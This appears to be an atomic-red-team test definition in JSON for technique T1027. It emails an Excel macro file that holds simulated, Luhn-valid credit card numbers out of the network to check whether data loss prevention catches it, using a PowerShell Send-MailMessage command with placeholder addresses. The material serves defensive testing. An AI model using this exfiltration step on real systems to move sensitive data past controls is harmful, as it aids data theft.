{
  "id": "129edb75-d7b8-42cd-a8ba-1f3db64ec4ad",
  "name": "DLP Evasion via Sensitive Data in VBA Macro over email",
  "description": "Upon successful execution, an excel containing VBA Macro containing sensitive data will be sent outside the network using email.\nSensitive data includes about around 20 odd simulated credit card numbers that passes the LUHN check.\n",
  "platforms": [
    "windows"
  ],
  "steps": [
    {
      "id": "398b8f6f-fd74-41fa-866e-fe9ca0b9d6df",
      "type": "execute-command",
      "data": {
        "command": "Send-MailMessage -From #{sender} -To #{receiver} -Subject 'T1027_Atomic_Test' -Attachments \"#{input_file}\" -SmtpServer #{smtp_server}\n",
        "command_type": "powershell"
      },
      "elevation_required": false
    }
  ],
  "tags": [
    "T1027",
    "atomic-red-team"
  ],
  "input_arguments": [
    {
      "name": "input_file",
      "type": "path",
      "description": "Path of the XLSM file",
      "value": "PathToAtomicsFolder\\T1027\\src\\T1027-cc-macro.xlsm"
    },
    {
      "name": "sender",
      "type": "string",
      "description": "sender email",
      "value": "test@corp.com"
    },
    {
      "name": "receiver",
      "type": "string",
      "description": "receiver email",
      "value": "test@corp.com"
    },
    {
      "name": "smtp_server",
      "type": "string",
      "description": "SMTP Server IP Address",
      "value": "127.0.0.1"
    }
  ]
}